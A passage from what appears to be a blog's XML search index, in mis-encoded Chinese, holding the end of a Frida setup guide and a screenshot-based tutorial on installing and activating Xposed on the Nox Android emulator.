.&#x2F;fsarm64 æ²¡æœ‰æŠ¥é”™è¯´æ˜æˆåŠŸ<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202202262017158.png" alt="æ²¡æœ‰æŠ¥é”™æˆåŠŸ"></p></li></ul><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><ul><li>è‡³æ­¤fridaå®‰è£…å®Œæ¯•ã€‚ä¸Šé¢æ¶‰åŠadb è¿™äº›å’Œæ‰‹æœºå‹å·æˆ‘è¿™é‡Œç”¨çš„æ˜¯Pixel ä¸€ä»£ å®‰å“10 æŸå®ç½‘ç«™æœ‰å– å¯ä»¥è‡ªè¡Œè´­ä¹°ã€‚ä¸‹è¯¾ã€‚åç»­æˆ‘è¿˜ä¼šå‘è¡¨ç›¸å…³æ•™ç¨‹</li></ul>]]></content>
      
      
      <categories>
          
          <category> AndroidReverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Frida </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¤œç¥æ¨¡æ‹Ÿå™¨ 7.0 å®‰å“ 64ä½å®‰è£… Xposed-å¹¶ä¸”æ¿€æ´»</title>
      <link href="/androidreverse/2023/01/articles/6a83169aaad6252d/"/>
      <url>/androidreverse/2023/01/articles/6a83169aaad6252d/</url>
      
        <content type="html"><![CDATA[<h1 id="Xposedä¸‹è½½"><a href="#Xposedä¸‹è½½" class="headerlink" title="Xposedä¸‹è½½"></a>Xposedä¸‹è½½</h1><p>xposedä¸‹è½½åœ°å€:<a href="https://github.com/youling257/XposedTools/files/1931996/xposed-x86_64.zip,%E8%A7%A3%E5%8E%8B%E5%88%9B%E5%BB%BAxposed,system%E6%96%87%E4%BB%B6%E5%A4%B9">https://github.com/youling257/XposedTools/files/1931996/xposed-x86_64.zip,è§£å‹åˆ›å»ºxposed,systemæ–‡ä»¶å¤¹</a> å¹¶ä¸”æŠŠå‹ç¼©åŒ…æ–‡ä»¶æ‹·è´åˆ°systemæ–‡ä»¶å¤¹æ‹·è´åˆ° xposedä¸‹é¢å¹¶ä¸”æŠŠscrip.shè„šæœ¬æ‹·è´åˆ°xposedé‡Œé¢</p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101236058.png" alt="æŠŠscript.shæ‹·è´åˆ°xposedé‡Œé¢"><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101241884.png"></p><p>ç„¶åæ‰“åŒ…å‹ç¼©ã€‚</p><h2 id="å®‰è£…å‰å‡†å¤‡"><a href="#å®‰è£…å‰å‡†å¤‡" class="headerlink" title="å®‰è£…å‰å‡†å¤‡"></a>å®‰è£…å‰å‡†å¤‡</h2><ul><li><p>å¼€å¯æ¨¡æ‹Ÿå™¨çš„usbè°ƒè¯•æ¨¡å¼ã€‚æ¥åˆ°è®¾ç½®-å…³äºå¹³æ¿ç”µè„‘å¦‚ä¸‹å›¾</p><ul><li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101244494.png" alt="æ¥åˆ°å…³äºå¹³æ¿ç”µè„‘"></p></li><li><p>æ¥åˆ°ç‰ˆæœ¬å·ç‚¹å‡»5æ¬¡è¿›å…¥usbè°ƒè¯•æ¨¡å¼å¦‚ä¸‹å›¾</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101246784.png" alt="è¿›å…¥usbè°ƒè¯•æ¨¡å¼"></p></li><li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101247342.PNG" alt="ç‚¹å‡»5æ¬¡è¿›å»è°ƒè¯•æ¨¡å¼"></p></li><li><p>è¿›å»å¤œç¥æ¨¡æ‹Ÿå™¨å®‰è£…ç›®å½•ã€‚æŸ¥çœ‹æ¨¡æ‹Ÿå™¨ç«¯å£</p></li><li><p>adb devices</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101250569.png"></p></li><li><p>æ‹·è´xposed.zip  åˆ°æ¨¡æ‹Ÿå™¨&#x2F;system&#x2F; æ–‡ä»¶å¤¹ã€‚æ‰§è¡Œä¸‹é¢ä¸¤ä¸ªå‘½ä»¤èµ‹äºˆæƒé™</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101251864.png"></p></li><li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101252395.png"></p></li><li><p>è¿›å…¥æ¨¡æ‹Ÿå™¨æŸ¥çœ‹è§£å‹æ–‡ä»¶ </p></li><li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101253452.png"></p></li><li><p>è§£å‹</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101254749.png"></p></li><li><p>åˆ‡æ¢åˆ°xposedæ–‡ä»¶å¤¹ä¸‹ã€‚</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101255910.png"></p></li></ul></li></ul><h2 id="åœ¨æ¨¡æ‹Ÿå™¨é‡Œé¢å®‰è£…xposed"><a href="#åœ¨æ¨¡æ‹Ÿå™¨é‡Œé¢å®‰è£…xposed" class="headerlink" title="åœ¨æ¨¡æ‹Ÿå™¨é‡Œé¢å®‰è£…xposed"></a>åœ¨æ¨¡æ‹Ÿå™¨é‡Œé¢å®‰è£…xposed</h2><ul><li>è¿è¡Œè„šæœ¬<ul><li><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101257021.png"></li></ul></li><li>æ‹·è´xposedå®‰è£…åŒ…<ul><li><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101258737.png"></li></ul></li><li>åœ¨æ‰§è¡Œä¸€æ¬¡è„šæœ¬<ul><li><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101258643.png"></li></ul></li><li>é‡å¯æ¨¡æ‹Ÿå™¨<ul><li><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101259605.png"></li></ul></li><li>å‡ºç°ä¸‹å›¾è¿™ä¸ªåœ¨é‡å¯ä¸€æ¬¡<ul><li><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101300896.png"></li></ul></li><li>å‡ºç°ä¸‹å›¾ç»§ç»­é‡å¯<ul><li><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101301634.png"></li></ul></li><li>å†æ¬¡é‡å¯å·²ç»æ¿€æ´»<ul><li><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101301475.png"></li></ul></li><li>æ¥ä¸‹æ¥å°±å¯ä»¥å®‰è£…xposedæ’ä»¶äº†å¦‚ä¸‹å›¾<ul><li><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202301101303608.png"></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> AndroidReverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Xposed </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
